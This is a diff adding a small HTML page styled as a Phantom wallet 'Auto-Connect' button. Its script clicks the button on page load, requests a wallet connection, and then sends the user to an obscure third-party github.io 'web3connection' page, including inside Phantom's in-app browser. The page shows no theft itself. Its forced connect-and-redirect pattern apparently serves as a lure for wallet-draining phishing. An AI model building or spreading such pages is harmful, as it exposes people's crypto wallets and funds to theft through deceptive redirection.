@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phantom Wallet Auto-Connect</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            text-align: center;
+        }
+        .phantom-button {
+            background-color: #4e44ce;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto;
+        }
+        .phantom-button:hover {
+            background-color: #3a30b0;
+        }
+        .phantom-button img {
+            width: 24px;
+            margin-right: 10px;
+        }
+        #status {
+            margin-top: 20px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="connectPhantom" class="phantom-button">
+            <img src="https://phantom.app/favicon.ico" alt="Phantom Logo">
+            Connect & Open in Phantom
+        </button>
+        <p id="status">Click the button to open in Phantom Wallet.</p>
+    </div>
+
+    <script>
+        document.getElementById('connectPhantom').addEventListener('click', async function() {
+            const url = 'https://zyperinnovative.github.io/cypher/web3connection%20(1).html';
+            const statusEl = document.getElementById('status');
+            
+            // Check if Phantom is installed (Browser Extension)
+            if (window.phantom?.solana?.isPhantom) {
+                try {
+                    statusEl.textContent = "Connecting to Phantom...";
+                    
+                    // Request connection to Phantom
+                    const response = await window.phantom.solana.connect();
+                    const publicKey = response.publicKey.toString();
+                    
+                    statusEl.textContent = "Connected! Opening link...";
+                    window.open(url, '_blank');
+                } catch (err) {
+                    statusEl.textContent = "Connection failed. Opening in browser instead...";
+                    window.open(url, '_blank');
+                }
+            } 
+            // Try Phantom Mobile deep link
+            else {
+                statusEl.textContent = "Attempting to open in Phantom Mobile...";
+                const phantomScheme = `phantom://browse/${encodeURIComponent(url)}`;
+                window.location.href = phantomScheme;
+                
+                // Fallback if Phantom app is not installed
+                setTimeout(() => {
+                    statusEl.textContent = "Phantom not detected. Opening in browser...";
+                    window.open(url, '_blank');
+                }, 1000);
+            }
+        });
+
+        // Optional: Auto-trigger on page load (remove if not needed)
+        window.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('connectPhantom').click();
+        });
+    </script>
+</body>
+</html>
